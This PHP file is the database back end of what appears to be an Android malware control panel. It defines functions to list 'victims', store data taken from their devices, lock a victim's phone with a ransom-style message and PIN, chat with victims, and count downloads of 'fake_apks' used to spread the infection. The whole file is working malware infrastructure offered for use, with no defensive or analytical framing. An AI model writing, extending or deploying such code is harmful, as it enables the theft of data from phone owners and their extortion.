<?php
require_once __DIR__ . '/../config/database.php';

class Database {
    private static $instance = null;
    private $conn;
    
    private function __construct() {
        try {
            $this->conn = new PDO(
                "mysql:host=".DB_HOST.";dbname=".DB_NAME,
                DB_USER,
                DB_PASS
            );
            $this->conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        } catch(PDOException $e) {
            die("Database Error: " . $e->getMessage());
        }
    }
    
    public static function getInstance() {
        if (self::$instance == null) {
            self::$instance = new Database();
        }
        return self::$instance->conn;
    }
}

// VICTIMS FUNCTIONS
function getAllVictims() {
    $db = Database::getInstance();
    $stmt = $db->query("SELECT v.*, 
                        (SELECT COUNT(*) FROM victim_data WHERE victim_id = v.id) as total_data,
                        (SELECT COUNT(*) FROM chat_logs WHERE victim_id = v.id AND is_read = 0) as unread_chats
                        FROM victims v ORDER BY last_active DESC");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function getVictim($id) {
    $db = Database::getInstance();
    $stmt = $db->prepare("SELECT * FROM victims WHERE id = ?");
    $stmt->execute([$id]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function lockVictimDevice($victimId, $message, $pin) {
    $db = Database::getInstance();
    $stmt = $db->prepare("UPDATE victims SET is_locked = 1, lock_message = ?, lock_pin = ? WHERE id = ?");
    return $stmt->execute([$message, $pin, $victimId]);
}

function unlockVictimDevice($victimId) {
    $db = Database::getInstance();
    $stmt = $db->prepare("UPDATE victims SET is_locked = 0, lock_message = NULL, lock_pin = NULL WHERE id = ?");
    return $stmt->execute([$victimId]);
}

// VICTIM DATA FUNCTIONS
function getVictimData($victimId) {
    $db = Database::getInstance();
    $stmt = $db->prepare("SELECT * FROM victim_data WHERE victim_id = ? ORDER BY created_at DESC");
    $stmt->execute([$victimId]);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function addVictimData($victimId, $type, $content, $filePath = null) {
    $db = Database::getInstance();
    $stmt = $db->prepare("INSERT INTO victim_data (victim_id, data_type, data_content, file_path) VALUES (?, ?, ?, ?)");
    return $stmt->execute([$victimId, $type, $content, $filePath]);
}

// CHAT FUNCTIONS
function getVictimChats($victimId) {
    $db = Database::getInstance();
    $stmt = $db->prepare("SELECT * FROM chat_logs WHERE victim_id = ? ORDER BY created_at ASC");
    $stmt->execute([$victimId]);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function sendChatToVictim($victimId, $message) {
    $db = Database::getInstance();
    $stmt = $db->prepare("INSERT INTO chat_logs (victim_id, message, sender) VALUES (?, ?, 'admin')");
    return $stmt->execute([$victimId, $message]);
}

function markChatsAsRead($victimId) {
    $db = Database::getInstance();
    $stmt = $db->prepare("UPDATE chat_logs SET is_read = 1 WHERE victim_id = ? AND sender = 'victim'");
    return $stmt->execute([$victimId]);
}

// APK FUNCTIONS
function getAllFakeApks() {
    $db = Database::getInstance();
    $stmt = $db->query("SELECT * FROM fake_apks ORDER BY download_count DESC");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function incrementApkDownload($apkId) {
    $db = Database::getInstance();
    $stmt = $db->prepare("UPDATE fake_apks SET download_count = download_count + 1 WHERE id = ?");
    return $stmt->execute([$apkId]);
}
?>
